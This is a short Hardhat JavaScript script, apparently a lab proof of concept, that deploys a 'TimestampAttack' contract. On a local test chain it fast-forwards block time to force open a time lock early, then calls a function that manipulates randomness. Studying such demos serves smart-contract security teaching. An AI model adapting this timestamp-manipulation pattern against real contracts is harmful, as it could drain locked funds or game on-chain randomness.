const hre = require("hardhat");

async function main() {
    const [attacker] = await hre.ethers.getSigners();
    console.log("[+] Timestamp Attack initiated");

    const deployments = require("../deployments.json");
    const TimestampAttack = await hre.ethers.getContractFactory("TimestampAttack");
    const contract = await TimestampAttack.deploy();
    await contract.deployed();

    const tx = await contract.createRelease(100, attacker.address, {value: hre.ethers.utils.parseEther("0.5")});
    await tx.wait();

    const releaseId = (await contract.releaseId()).sub(1);
    console.log("[i] Time lock created: ID", releaseId.toString());

    await hre.network.provider.send("evm_increaseTime", [200]);
    await hre.network.provider.send("evm_mine");

    const tx2 = await contract.forceRelease(releaseId);
    await tx2.wait();
    console.log("[✓] Time lock bypassed via timestamp manipulation");

    const manipulated = await contract.manipulateRandom();
    console.log("    Manipulated random:", manipulated.toString());
}

main().catch(console.error);
